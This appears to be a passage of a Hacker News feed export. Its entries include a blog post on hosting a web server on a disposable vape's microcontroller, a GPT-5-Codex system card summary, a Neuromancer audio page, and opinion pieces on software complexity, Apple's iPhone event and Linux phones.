This is actually easier than you might imagine, pyOCD can forward all semihosting though a telnet port. Then, we use &lt;code&gt;socat&lt;/code&gt; to link that port to a virtual tty:&lt;/p&gt;
    &lt;code&gt;pyocd gdb -S -O semihost_console_type=telnet -T $(PORT) $(PYOCDFLAGS) &amp;amp;
socat PTY,link=$(TTY),raw,echo=0 TCP:localhost:$(PORT),nodelay &amp;amp;
sudo slattach -L -p slip -s 115200 $(TTY) &amp;amp;
sudo ip addr add 192.168.190.1 peer 192.168.190.2/24 dev sl0
sudo ip link set mtu 1500 up dev sl0
&lt;/code&gt;
    &lt;p&gt;Ok, so we have a “modem”, but that’s hardly a web server. To actually talk TCP/IP, we need an IP stack. There are many choices, but I went with uIP because it’s pretty small, doesn’t require an RTOS, and it’s easy to port to other platforms. It also, helpfully, comes with a very minimal HTTP server example.&lt;/p&gt;
    &lt;p&gt;After porting the SLIP code to use semihosting, I had a working web server&amp;amp;mldr;half of the time. As with most highly optimised libraries, uIP was designed for 8 and 16-bit machines, which rarely have memory alignment requirements. On ARM however, if you dereference a &lt;code&gt;u16 *&lt;/code&gt;, you better hope that address is even, or you’ll get an exception. The &lt;code&gt;uip_chksum&lt;/code&gt; assumed &lt;code&gt;u16&lt;/code&gt; alignment, but the script that creates the filesystem didn’t.
I actually decided to modify a bit the structure of the filesystem to make it a bit more portable.
This was my first time working with &lt;code&gt;perl&lt;/code&gt; and I have to say, it’s quite well suited to this kind of task.&lt;/p&gt;
    &lt;head rend="h1"&gt;Blazingly fast#&lt;/head&gt;
    &lt;p&gt;So how fast is a web server running on a disposable microcontroller. Well, initially, not very fast. Pings took ~1.5s with 50% packet loss and a simple page took over 20s to load. That’s so bad, it’s actually funny, and I kind of wanted to leave it there.&lt;/p&gt;
    &lt;p&gt;However, the problem was actually between the seat and the steering wheel the whole time. The first implementation read and wrote a single character at a time, which had a massive overhead associated with it. I previously benchmarked semihosting on this device, and I was getting ~20KiB/s, but uIP’s SLIP implementation was designed for very low memory devices, so it was serialising the data byte by byte. We have a whopping 3kiB of RAM to play with, so I added a ring buffer to cache reads from the host and feed them into the SLIP poll function. I also split writes in batches to allow for escaping.&lt;/p&gt;
    &lt;p&gt;Now this is what I call blazingly fast! Pings now take 20ms, no packet loss and a full page loads in about 160ms. This was using using almost all of the RAM, but I could also dial down the sizes of the buffer to have more than enough headroom to run other tasks. The project repo has everything set to a nice balance latency and RAM usage:&lt;/p&gt;
    &lt;code&gt;Memory region         Used Size  Region Size  %age Used
           FLASH:        5116 B        24 KB     20.82%
             RAM:        1380 B         3 KB     44.92%
&lt;/code&gt;
    &lt;p&gt;For this blog however, I paid for none of the RAM, so I’ll use all of the RAM.&lt;/p&gt;
    &lt;p&gt;As you may have noticed, we have just under 20kiB (80%) of storage space. That may not be enough to ship all of React, but as you can see, it’s more than enough to host this entire blog post. And this is not just a static page server, you can run any server-side code you want, if you know C that is.&lt;/p&gt;
    &lt;p&gt;Just for fun, I added a json api endpoint to get the number of requests to the main page (since the last crash) and the unique ID of the microcontroller.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://bogdanthegeek.github.io/blog/projects/vapeserver/"/><published>2025-09-15T17:53:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45253458</id><title>Addendum to GPT-5 system card: GPT-5-Codex</title><updated>2025-09-16T13:01:46.202409+00:00</updated><content>&lt;doc fingerprint="9c432defe1bb46cd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Addendum to GPT-5 system card: GPT-5-Codex&lt;/head&gt;
    &lt;p&gt;GPT‑5-Codex is a version of GPT‑5 optimized for agentic coding in Codex. Like its predecessor, codex-1, this model was trained using reinforcement learning on real-world coding tasks in a variety of environments to generate code that closely mirrors human style and PR preferences, adhere precisely to instructions, and iteratively run tests until passing results are achieved.&lt;/p&gt;
    &lt;p&gt;This model is available locally in the terminal or IDE through Codex CLI and IDE extension, and on the cloud via the Codex web, GitHub, and the ChatGPT mobile app.&lt;/p&gt;
    &lt;p&gt;This addendum outlines the comprehensive safety measures implemented for GPT‑5-Codex. It details both model-level mitigations, such as specialized safety training for harmful tasks and prompt injections, and product-level mitigations like agent sandboxing and configurable network access.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://openai.com/index/gpt-5-system-card-addendum-gpt-5-codex/"/><published>2025-09-15T18:45:32+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45253775</id><title>How People Use ChatGPT [pdf]</title><updated>2025-09-16T13:01:45.516865+00:00</updated><content/><link href="https://cdn.openai.com/pdf/a253471f-8260-40c6-a2cc-aa93fe9f142e/economic-research-chatgpt-usage-paper.pdf"/><published>2025-09-15T19:14:28+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45255137</id><title>William Gibson Reads Neuromancer (2004)</title><updated>2025-09-16T13:01:45.356913+00:00</updated><content>&lt;doc fingerprint="7a59d0cbefbe40c0"&gt;
  &lt;main&gt;
    &lt;p&gt;The author Ray Bradbury is one of the early science fiction authors that moved science fiction into a literary form. As a writer Bradbury constructs beautifully written stories and novels. Bradbury's writing is in stark contrast to Bradbury as a speaker. The first time I heard Ray Bradbury speak was at the Association for Computing Machinery (ACM) yearly conference in Los Angeles in the 1980s. Hearing Bradbury speak is an almost painful experience. The pictures that Bradbury can paint with the written word seem to be entirely missing when Bradbury speaks. He is halting, awkward and does not seem to know where he wants to go in his talk.&lt;/p&gt;
    &lt;p&gt;In contrast to Bradbury, listenting to William Gibson has the feel of his written work. The same complex world view and sentence structure is there, although not as finely edited. An example of this can be found in the documentary made about William Gibson, No Maps for these Territories. This documentary includes extensive interviews with William Gibson. No Maps also provides a glimpse of the way Gibson looks at the interconnections and relationships in the world around us. This view of Gibson's mind shows us his genius.&lt;/p&gt;
    &lt;p&gt;The mirror between William Gibson's spoken voice and his written voice gives special force to his readings of his work. Early in his career Gibson did an abridged reading of Neuromancer, his first novel and the work that made him famous. It was in this novel that Gibson coined the term cyberspace. This reading was only published on audio-tape and is now out of print.&lt;/p&gt;
    &lt;p&gt;I hate the idea that Gibson's wonderful reading of Neuromancer should be lost or inaccessable. I was only able to hear it because the Mountain View (California) Library had a copy. Fortunately I've been able to find an MP3 copy of these audio tapes. They can be downloaded below.&lt;/p&gt;
    &lt;p&gt;I am only providing these MP3s because the original has been out of print for years. As a software engineer I believe that I should be paid for my work. If I hold this view then it is only reasonable that I should also believe that artist should be paid for their work. All of the software and music I own I have paid for (or is open source). I would prefer that the publisher re-issue the audio-tape of William Gibson's reading in a more modern format (perhaps CD) and that William Gibson collect royalties on this work. Gibson's reading has been out of print so long that I can only assume that this is unlikely to happen.&lt;/p&gt;
    &lt;p&gt;If you're a fan of William Gibson I hope that others will mirror these files as well so that they will never be lost.&lt;/p&gt;
    &lt;p&gt;This reading was published on four magnetic tape audio cassetts. These have been re-recorded in MP3 format:&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell role="head"&gt;Neuromancer (abridged) read by William Gibson&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 1, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 1, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 2, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 2, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 3, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 3, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 4, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 4, side 2&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;An on-line copy of William Gibson's Neuromancer&lt;/p&gt;
    &lt;p&gt;Neuromancer is one of the few books that I've read many times. All of Gibson's books are good (well, except for The Difference Engine, but that's Bruce Sterling's fault). Neuromancer is still in print, so you should go out an buy a copy if you want to read it. Writers pay their bills from the royalties from book sales. I've included the link above in case you want to get a feel for the book before you buy it (even paperback books are not cheap these days).&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="http://bearcave.com/bookrev/neuromancer/neuromancer_audio.html"/><published>2025-09-15T21:28:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45256043</id><title>Why do we keep gravitating toward complexity?</title><updated>2025-09-16T13:01:45.068514+00:00</updated><content>&lt;doc fingerprint="7fcb133f0587e7ad"&gt;
  &lt;main&gt;
    &lt;p&gt;The Great Pyramids took decades to build. It was a monumental feat of human ingenuity and collaboration. Today, we software developers erect our own pyramids each day - not from stone, but from code. Yet despite far more advanced tools, these systems don’t always make the experience better. So why, when KISS (Keep It Simple, Stupid) is a well-known mantra, do we keep gravitating toward complexity?&lt;/p&gt;
    &lt;head rend="h2"&gt;Marketing &amp;gt; Simplicity&lt;/head&gt;
    &lt;p&gt;Sell me this pen: ✎&lt;/p&gt;
    &lt;p&gt;What? You don’t know how? Okay, instead, sell me this Penzilla - a pen that can erase, write in different colors, play music, dial 911, act as a radio antenna, and even help you cheat on your homework.&lt;/p&gt;
    &lt;p&gt;In the software world, how would you sell a competitor to the &lt;code&gt;cat&lt;/code&gt; command?
Sounds insane, right? It’s so simple - why would anyone compete with it, let
alone build an alternative? (Let’s pretend Rust coreutils don’t exist.)&lt;/p&gt;
    &lt;p&gt;But what if instead of a &lt;code&gt;cat&lt;/code&gt; competitor, it was catzilla - a tool that could
watch your files, hop through portals, and jump across networks? Now that’s
marketable! Still, nobody would take you seriously. Why? Because &lt;code&gt;cat&lt;/code&gt; just
works, and it’s highly unlikely anyone will ever need anything else (just like
Penzilla).&lt;/p&gt;
    &lt;p&gt;However, if &lt;code&gt;catzilla&lt;/code&gt; were hyped from every corner of the internet, with a
CatConf coming next month, you’d at least be curious to try it. Social proof
makes you take it seriously. Even if it’s just a gimmick, it’s still a gimmick
with users.&lt;/p&gt;
    &lt;p&gt;Complexity also signals effort, expertise, and exclusivity. If you struggle to understand it, your brain rewards you with awe: “Wow, this must be really smart,” you think - even if a simpler solution would work just as well.&lt;/p&gt;
    &lt;p&gt;Marketers, engineers, and startups all exploit this trick. The more layers, the fancier the terminology, the more “premium” it feels. Complexity turns into a status symbol rather than a necessity.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is inside the Great Pyramids?&lt;/head&gt;
    &lt;p&gt;Whatever you put inside, duh. Like the Pyramids, modern software is built layer upon layer - dependencies, frameworks, and abstractions stacked high. But just as the Pyramids’ inner chambers are often empty, these layers can hide a lack of substance, making maintenance a nightmare.&lt;/p&gt;
    &lt;p&gt;When you look at a Pyramid, only a moment later you notice your mouth is open wide in awe (close it now). Simplicity, on the other hand, doesn’t hold any secrets inside. It’s invisible until you realize it’s genius.&lt;/p&gt;
    &lt;p&gt;Complexity shouts, “Look at me!”, while simplicity whispers “Did you notice?”.&lt;/p&gt;
    &lt;p&gt;One thing for sure, though, simplicity often wins in the long run. After the initial amazement is gone, it’s the function that quietly does the job that most people need.&lt;/p&gt;
    &lt;head rend="h2"&gt;React vs. vanilla JavaScript&lt;/head&gt;
    &lt;p&gt;This is a classic example I love to rant about.&lt;/p&gt;
    &lt;p&gt;React piles concepts into your mental backpack: rendering models, hooks, state libraries, routing, and a build pipeline. Say no to it, and suddenly you’re the “neckbeard stuck in the ’90s,” outside the cool-kids club.&lt;/p&gt;
    &lt;p&gt;The simple alternative is just around the corner: sprinkle vanilla JavaScript where it’s needed and don’t build your identity around a framework. That mindset is hard to swallow, though (especially when companies have spent millions convincing developers their stack is the only way forward).&lt;/p&gt;
    &lt;head rend="h2"&gt;Beyond marketing: why we embrace complexity&lt;/head&gt;
    &lt;p&gt;While marketing glorifies and normalizes complexity, several deeper, more innate forces draw us developers toward it:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The creative temptation: We are problem-solvers by nature. Building a complex, intricate system is a rewarding intellectual challenge, akin to solving a magnificent puzzle. The temptation to over-engineer is a powerful siren song when we’re flexing our creative muscles.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Legacy systems and technical debt: Many projects inherit convoluted codebases. Adding new features often means piling on more complexity rather than simplifying, as time and budget constraints prioritize quick fixes over elegant, simple solutions.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Team dynamics and collaboration: In large teams, developers add layers of abstraction to make code “future-proof” or accommodate diverse requirements. This can lead to over-engineered solutions as each contributor adds their own signature, creating a complex whole that no single person fully understands.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Pressure to innovate: In a competitive tech landscape, there’s a constant pressure to differentiate. Novelty and innovation are often expressed through new features and intricate designs, making complexity an easy, if not always effective, way to stand out.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Build pyramids with purpose&lt;/head&gt;
    &lt;p&gt;Build pyramids if you must, but build them like the Egyptians did: with a clear purpose, a solid foundation, and chambers that actually contain something of value - not just hollow, maze-like passages that future archaeologists (or the poor soul maintaining your code in two years) will curse.&lt;/p&gt;
    &lt;p&gt;So next time you find yourself coding a 500-line abstraction for something that could be copy-pasted a few times and done in 50 lines, ask yourself: are you solving a real problem for the users and maintainers… or just indulging in intellectual masturbation?&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://kyrylo.org/software/2025/08/21/why-do-software-developers-love-complexity.html"/><published>2025-09-15T23:02:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45256577</id><title>I feel Apple has lost its alignment with me and other long-time customers</title><updated>2025-09-16T13:01:44.578335+00:00</updated><content>&lt;doc fingerprint="a40c890f536739d9"&gt;
  &lt;main&gt;
    &lt;p&gt;A first version of this piece was almost ready to be published two days ago, but after writing more than 2,000 words, I grew increasingly angry and exasperated, and that made the article become too meandering and rant-like, so I deleted everything, and started afresh several hours later.&lt;/p&gt;
    &lt;p&gt;This, of course, is about Awe-dropping, Apple’s September 9 event, where they presented the new iPhone lineup, the new AirPods Pro, and the new Apple Watches. And the honest truth here is that I’m becoming less and less inclined to talk about Apple, because it’s a company that I feel has lost its alignment with me and other long-time Apple users and customers.&lt;/p&gt;
    &lt;p&gt;The more Apple talks and moves like other big tech companies, the less special it gets; the less special and distinctive it gets, the less I’m interested in finding ways to talk about it. Yes, I have admitted that Apple makes me mad lately, so they still elicit a response that isn’t utter indifference on my part. And yes, you could argue that if Apple makes me mad, it means that in the end I still care.&lt;/p&gt;
    &lt;p&gt;But things aren’t this clear-cut. I currently don’t really care about Apple — I care that their bad software design decisions and their constant user-interface dumbing down may become trends and get picked up by other tech companies. So, what I still care about that’s related to Apple is essentially the consequences of their actions.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Steve Jobs quote&lt;/head&gt;
    &lt;p&gt;The event kicked off with the famous Steve Jobs quote,&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Design is not just what it looks like and feels like. Design is how it works.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;and I immediately felt the whiplash.&lt;/p&gt;
    &lt;p&gt;Why that quote? Why now, after months of criticism towards the new design æsthetic of Liquid Glass? I gave this choice three possible interpretations — I still may be missing something here; I’m sure my readers will let me know.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;It’s Apple’s way of trolling the critics, who have repeatedly resorted to Steve Jobs’s words to criticise the several misguided UI choices in Liquid Glass. It’s the same kind of response as Phil Schiller famously blurting, Can’t innovate anymore, my ass! in 2013 during the presentation of the then-redesigned Mac Pro. But it feels like a less genuine, more passive-aggressive response (if this is the way we’re supposed to read their use of that quote).&lt;/item&gt;
      &lt;item&gt;Apple used the quote in earnest. As in, they really believe that what they’re doing is in line with Jobs’s words. If that’s the case, this is utter self-deception. The quote doesn’t reflect at all what Apple is doing in the UI and software department — the Liquid Glass design is more ‘look &amp;amp; feel’ than ‘work’. And the very introduction of the iPhone Air proves that Jobs’s words are falling on deaf ears on the hardware front as well.&lt;/item&gt;
      &lt;item&gt;Apple used the quote ‘for effect’. As if Meta started a keynote by saying, Our mission is to connect people, no more no less. You know, something that makes you sound great and noble, but not necessarily something you truly believe (or something that is actually true, for that matter).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I can’t know for sure which of these might be the correct interpretation. I think it heavily depends on whose Apple executive came up with the idea. Whatever the case may be, the effect was the same — it felt really jarring and tone-deaf.&lt;/p&gt;
    &lt;head rend="h2"&gt;AirPods and Watches&lt;/head&gt;
    &lt;p&gt;If you’re not new here, you’ll know that these are the Apple products I care the least, together with HomePods and Apple TV. I always tune out when Apple presents these, so browse Apple’s website or go read the technical breakdown elsewhere. Personally, I’m too into traditional horology and therefore the design of the Apple Watch has always felt unimaginative at best, and plain ugly at worst.&lt;/p&gt;
    &lt;p&gt;From a UI standpoint, the Apple Watch continues to feel too complicated to use, and too overburdened with features. I wouldn’t say it’s design by committee, but more like designed to appeal to a whole committee. Apple wants the watch to appeal to a wide range of customers, therefore this little device comes stuffed with all kinds of bells and whistles. As I said more than once, the real feature I would love to see implemented is the ability to just turn off entire feature sets, so that if you only want to use it as a step counter and heart rate monitor, you can tell the watch to be just that; this would be more than just having a watchface that shows you time, steps, heart rate — it would be like having a watch that does only that. With all the features you deem unnecessary effectively disabled, imagine how simpler interacting with it would be, and imagine how longer its battery life would be.&lt;/p&gt;
    &lt;p&gt;What really got on my nerves during the Apple Watch segment of the event, though, is this: Apple always, always inserts a montage of sob stories about how the Apple Watch has saved lives, and what an indispensable life-saving device it is. Don’t get me wrong, I’m glad those lives were saved. But this kind of ‘showcase’ every year is made in such poor taste. It’s clear to me that it’s all marketing above everything else, that they just want to sell the product, and these people’s stories end up being used as a marketing tactic. It’s depressing.&lt;/p&gt;
    &lt;p&gt;As for the AirPods, and true wireless earbuds in general, I find this product category to be the most wasteful. Unless someone comes up with a type of earbuds that have easily replaceable batteries, I’m not interested in buying something that’s bound to become e‑waste in a relatively short period of time.&lt;/p&gt;
    &lt;head rend="h2"&gt;The new iPhones&lt;/head&gt;
    &lt;p&gt;Don’t buy them. Don’t waste your money, unless you have money to waste and don’t care about a company with this kind of leadership. Read How Tim Cook sold out Steve Jobs by Anil Dash to understand how I feel. I couldn’t have said it better myself.&lt;/p&gt;
    &lt;p&gt;I’d wrap up my article here, but then I’d receive a lot of emails asking me why I didn’t talk about the iPhones, so here are a few stray observations:&lt;/p&gt;
    &lt;p&gt;One, maybe involuntary, user-friendly move Apple did with this new iPhone lineup is that now we have three very distinct iPhone models, whose nature and price should really help people decide which to purchase.&lt;/p&gt;
    &lt;p&gt;The regular iPhone 17 is the safe, iterative solution. It looks like an iPhone 16, it works like an iPhone 16 that has now better features. It’s the ideal phone for the average user (tech-savvy or not). It’s the safe choice and the best value iPhone overall.&lt;/p&gt;
    &lt;p&gt;The iPhone 17 Pro is possibly the most Pro iPhone to date. During its presentation, I felt like Apple wants you to consider this more like a pro camera for videographers and filmmakers rather than just a smartphone with a good camera array. People who have no use for all these pro video recording features shouldn’t waste their money on it. Unless they want a big chunky iPhone with the best camera array and/or have money to burn. In my country (Spain), the 6.3‑inch iPhone 17 Pro starts at €1,319 with 256GB of storage, and goes up to €1,819 with 1TB of storage. For the bigger iPhone 17 Pro, those prices become €1,469 and €1,969 respectively, and if you want the iPhone 17 Pro Max with 2TB of storage, it’ll cost you €2,469. You do you, but I think these are insane prices for phones (and SSDs).&lt;/p&gt;
    &lt;p&gt;The iPhone Air is just… odd. I was curious to know about other techies’ reactions, and of all the major tech YouTubers, I think the one I’m agreeing the most on their first impressions of the iPhone Air is Marques Brownlee. At this point in his video, he says:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;I really think this phone is gonna be a hard sell, because if you subtract emotions from it, it’s just… the worst one. This is gonna jump in the lineup at $999 — it replaces essentially the Plus phones in the lineup — and it is surrounded by other iPhones that are better than it in basically every way, other than being super thin and light. So it’s a fascinating gamble.&lt;/p&gt;
      &lt;p&gt;This phone has the same A19 Pro chip in it as the Pro phones, minus one GPU core. Interesting choice: apparently it’s a bit more efficient than the base A19, so that’s good for battery life. But we also just heard a whole long list of choices Apple made with the Pro phones to make them more thermally efficient to not overheat — switching from titanium to aluminium, and adding a vapour chamber to the back. But this phone is still titanium, and absolutely does not have room for an advanced thermal solution or any sort of vapour chamber, so it sounds like this phone could get much hotter and throttle performance much quicker. It’s a red flag.&lt;/p&gt;
      &lt;p&gt;Now we also know that ultra-thin phones have a tendency to be a little bit less durable. They’ve bent over the years. And I’m not gonna be the first one to point this out. […] And Apple of course has thought about this. They’ve for sure tested this, and they’re telling us it’s the most durable iPhone ever. But, I mean, I’m looking at the phone and I think it qualifies also as a red flag. And then we already know there is just no way battery life can be good on this phone, right? There’s just no way. I’ve been reviewing phones for more than a decade, and all signs point to it being trash.&lt;/p&gt;
      &lt;p&gt;There was a slide in the keynote today about how they were still proud to achieve ‘all-day battery life’. But, like, come on. Really? I mean they still do the thing where they rearranged the components up into the little plateau at the top to make room for more battery at the bottom. But there’s just absolutely not enough room in this phone for a large battery. And it doesn’t appear to be silicon-carbon, or any sort of a special ultra-high density battery.&lt;/p&gt;
      &lt;p&gt;And Apple also announced it alongside a special dedicated MagSafe battery accessory, just for this phone, that adds 3,149 mAh, and just barely, combined, will match the 17 Pro in terms of quoted video playback. So if that doesn’t scream red flag, I don’t know what to tell you.&lt;/p&gt;
      &lt;p&gt;It is also e‑SIM-only, globally, ’cause there’s no room in any version of this phone for a plastic SIM card. There’s also no millimeter-wave 5G. And like I said, it’s coming in at $1,000, which is more expensive than the base iPhone, which will have a better camera system, and better battery life, and may overheat less.&lt;/p&gt;
      &lt;p&gt;So look, I think there’s two ways to look at this phone. This is either Apple just throwing something new at the wall and seeing if it sticks. […] Or you can see this as a visionary, long-time-in-the-making preview at the future of all phones. Like, maybe someday in the future every phone will be this thin. And Apple is just now, today, getting the tech together with the battery and display and modem and Apple Silicon to make this phone possible. Maybe kind of like how the first MacBook Air sucked, and was underpowered, but then eventually all laptops became that thin. Maybe that’s also what’s gonna happen to smartphones. And maybe the same way Samsung made the ultra-thin S25 Edge, and then a few months later they came out with their super-thin foldable, the Z Fold7, and I felt like the Edge phone was one half of that foldable. Maybe that’s also what Apple’s doing. Maybe we’re gonna see an ultra-thin foldable iPhone next year. Maybe.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Yeah, I’m firmly in the “Apple throwing something new at the wall and seeing if it sticks” camp. Because what’s that innovative in having thin smartphones? What’s the usefulness when the other two dimensions keep increasing? Making a thin and light and relatively compact MacBook and calling it ‘Air’ made sense back when virtually no other laptop was that thin and light. It was, and is, a great solution for when you’re out and about or travelling, and space is at a premium; and you also don’t want a bulky computer to lug around.&lt;/p&gt;
    &lt;p&gt;Then Apple applied the ‘Air’ moniker to the iPad, and that started to make less sense. It’s not that a regular or Pro iPad were and are that cumbersome to begin with. And then Apple felt the need to have MacBook Airs that are 13- and 15-inch in size, instead of 11- and 13-inch. A 15-inch MacBook Air makes little sense, too, as an ‘Air’ laptop. It may be somewhat thin, somewhat light, but it’s not exactly compact.&lt;/p&gt;
    &lt;p&gt;And now we have the iPhone Air — which is just thin for thinness’ sake. It’s still a big 6.5‑inch phone that’s hardly pocketable. I still happen to handle and use a few older iPhones in the household, and the dimensions of the iPhone 5/5S/SE make this iPhone more ‘Air’ than the iPhone Air. If you want a slightly more recent example, the iPhone 12 mini and 13 mini have the real lightness that could make sense in a phone. Perhaps you’ll once again remind me that the iPhone 12 mini and 13 mini weren’t a success, but I keep finding people telling me they would favour a more compact phone than a big-but-thin phone. I’ll be truly surprised if the iPhone Air turns out to be a bigger success than the ‘mini’ iPhones. It is a striking device in person, no doubt, but once this first impact is gone and you start thinking it over and making your decision, what Marques Brownlee said above is kind of hard to deny.&lt;/p&gt;
    &lt;p&gt;I find particularly hilarious the whole MagSafe battery accessory affair. Apple creates a super-thin, super-light phone, proudly showcases its striking design, and immediately neutralises this bold move and thin design by offering an accessory 1) that you’ll clearly need if you want to have a decently-lasting battery (thus admitting that that thinness certainly came with an important compromise); and 2) that instantly defeats the purpose of a thin design by returning the bulk that was shaved away in making the phone.&lt;/p&gt;
    &lt;head rend="h2"&gt;What should I be in awe of?&lt;/head&gt;
    &lt;p&gt;I found a lot of reactions to these products to be weirdly optimistic. Either I’m becoming more cynical with age and general tech fatigue, or certain people are easily impressed. What usually impresses me is some technological breakthrough I didn’t see coming, or a clever new device, or some clever system software features and applications that give new purposes to a device I’ve known well for a while. This event, and what was presented, didn’t show any of this.&lt;/p&gt;
    &lt;p&gt;Didn’t you expect Apple to be able to produce yet another iteration of Apple Watches and AirPods that were better than the previous one? Didn’t you expect Apple to be able to make a unibody iPhone after years of making unibody computers? Didn’t you expect Apple to be able to have iPhones with better cameras and recording capabilities than last year’s iPhones? Didn’t you expect Apple to be able to make a thinner iPhone? To come up with better chips? Or a vapour chamber to prevent overheating? Or a ‘centre stage’ feature for the selfie camera? Are these things I should be in awe of?&lt;/p&gt;
    &lt;p&gt;I will probably be genuinely amazed when Apple is finally able to come up with a solution that entirely removes the dynamic island from the front of the iPhone while still having a front-facing camera up there.&lt;/p&gt;
    &lt;p&gt;I’ll be similarly amazed when Apple finally gets rid of people who have shown to know very little about software design and user interfaces, and comes up with operating systems that are, once again, intuitive, discoverable, easy to use, and that both look and work well. Because the iOS, iPadOS, and Mac OS 26 releases are not it — and these new iPhones might be awe-inspiring all you want, but you’ll still have to deal with iOS 26 on them. These new iPhones may have a fantastic hardware and all, but what makes any hardware tick is the software. You’ve probably heard that famous quote by Alan Kay, People who are really serious about software should make their own hardware. Steve Jobs himself quoted it, adding that “this is how we feel about it” at his Apple. Today’s Apple needs to hear a revised version of that quote, something like, People who are this serious about their hardware should make better software for it.&lt;/p&gt;
    &lt;p&gt;The level of good-enough-ism Apple has reached today in software is downright baffling. This widening gap between their hardware and software competence is going to be really damaging if the course isn’t corrected. The tight integration between hardware and software has always been what made Apple platforms stand out. This integration is going to get lost if Apple keeps having wizards for hardware engineers on one side, and software and UI people producing amateurish results on the other side. Relying on legacy and unquestioning fanpeople, for whom everything Apple does is good and awesome and there’s nothing wrong with it, can only go so far. Steve Jobs always knew that software is comparatively more important than the hardware. In a 1994 interview with Jeff Goodell, published by Rolling Stone in 2010 (archived link), Jobs said:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The problem is, in hardware you can’t build a computer that’s twice as good as anyone else’s anymore. Too many people know how to do it. You’re lucky if you can do one that’s one and a third times better or one and a half times better. And then it’s only six months before everybody else catches up. But you can do it in software.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;But not if you keep crippling it because you want to bring all your major platforms to the lowest common denominator.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://morrick.me/archives/10137"/><published>2025-09-16T00:20:59+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45256651</id><title>Linux phones are more important now than ever</title><updated>2025-09-16T13:01:42.074609+00:00</updated><content>&lt;doc fingerprint="b72d911f8a07b5e5"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;E: apparently it needs to be said that I am not suggesting you switch to Linux on your phone today; just that development needs to accelerate. Please don’t be one of the 34 people that replied to tell me Linux is not ready.&lt;/head&gt;
    &lt;p&gt;Android has always been a fairly open platform, especially if you were deliberate about getting it that way, but we’ve seen in recent months an extremely rapid devolution of the Android ecosystem:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The closing of development of an increasing number of components in AOSP.&lt;/item&gt;
      &lt;item&gt;Samsung, Xiaomi and OnePlus have removed the option of bootloader unlocking on all of their devices. I suspect Google is not far behind.&lt;/item&gt;
      &lt;item&gt;Google implementing Play Integrity API and encouraging developers to implement it. Notably the EU’s own identity verification wallet requires this, in stark contrast to their own laws and policies, despite the protest of hundreds on Github.&lt;/item&gt;
      &lt;item&gt;And finally, the mandatory implementation of developer verification across Android systems. Yes, if you’re running a 3rd-party OS like GOS you won’t be directly affected by this, but it will impact 99.9% of devices, and I foresee many open source developers just opting out of developing apps for Android entirely as a result. We’ve already seen SyncThing simply discontinue development for this reason, citing issues with Google Play Store. They’ve also repeatedly denied updates for NextCloud with no explanation, only restoring it after mass outcry. And we’ve already seen Google targeting any software intended to circumvent ads, labeling them in the system as “dangerous” and “untrusted”. This will most certainly carry into their new “verification” system.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Google once competed with Apple for customers. But in a world where Google walks away from the biggest antitrust trial since 1998 with yet another slap on the wrist, competition is dead, and Google is taking notes from Apple about what they can legally get away with.&lt;/p&gt;
    &lt;p&gt;Android as we know it is dead. And/or will be dead very soon. We need an open replacement.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;I’m also owner of SailfishOS phone there are some issues though but OS is great :)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Hi, I’ve just registered here to bring an addition to the conversation that hasn’t been mentioned yet: Droidian.&lt;/p&gt;
        &lt;p&gt;It’s a Debian-based distro that can run on a number of Android phones, and it uses Halium technology to utilize the Android device drivers, but on top of those, it provides a complete Debian+Phosh experience!&lt;/p&gt;
